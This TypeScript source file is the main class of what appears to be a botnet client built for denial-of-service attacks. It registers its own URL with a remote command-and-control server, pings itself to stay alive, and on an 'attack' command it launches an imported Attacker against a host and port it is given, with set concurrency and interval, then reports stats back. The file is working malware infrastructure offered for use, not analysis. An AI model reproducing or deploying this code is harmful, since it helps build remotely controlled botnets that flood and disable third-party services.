import express from "express";
import { Stats } from "./stats";
import { Attacker } from "./attacker";
import request from "request";
import errorHandler from "errorhandler";
import { UpdateNotifier } from "./update-notifier";

export class App {
    private expressApp: express.Application;
    private stats: Stats;
    private attacker: Attacker;
    private updateNotifier: UpdateNotifier;

    constructor() {
        this.expressApp = express();
        this.stats = new Stats();
        this.attacker = new Attacker(this.stats);
        this.attacker.events.on('loop', this.onAttackLoop.bind(this));

        this.initExpress();
    }

    startServer() {
        setInterval(this.selfPing.bind(this), 300000);
        this.selfPing();

        const server = this.expressApp.listen(this.expressApp.get("port"), () => {
            console.log(
                "  App is running at http://localhost:%d in %s mode",
                this.expressApp.get("port"),
                this.expressApp.get("env")
            );
            console.log("  Press CTRL-C to stop\n");
        });

        this.updateNotifier = new UpdateNotifier(server);

        this.initSocket();
        this.registerServer();
    }

    private initExpress() {
        // Express configuration
        this.expressApp.set("port", process.env.PORT || 8080);
        this.expressApp.get('/', (req, res) => {
            res.status(200).send(this.stats.isRun);
        });

        /**
         * Error Handler. Provides full stack
         */
        this.expressApp.use(errorHandler());
    }

    private selfPing() {
        if(process.env.URL) {
            const req = request.get({url: process.env.URL}, (err) => {
                err ? console.log('SelfTest error, '+err) : console.log('SelfTest OK');
                req.destroy();
            });
        }
    }

    private onAttackLoop(stats: Stats) {
        if(this.updateNotifier) {
            this.updateNotifier.send(stats);
        }
    }

    private registerServer() {
        try {
            const url = `${process.env.CMD_URL}api/control/register`;
            const req = request.post({
                url,
                json: true,
                body: { botUrl: process.env.URL }
            }, (err, res) => {
                req.destroy();
                if (err) {
                    console.error(err);
                    return;
                }
            });
        } catch (err) {
            console.error(err);
        }
    }

    private initSocket() {
        this.updateNotifier.on('receive', (info) => {
            switch(info.cmd) {
                case 'attack':
                    const data = info.data;
                    this.attacker.run(data.host, data.port, data.conncurrency || 100, data.interval || 10);
                    break;
                case 'stop':
                    this.attacker.stop();
                    break;
            }
        });
    }
}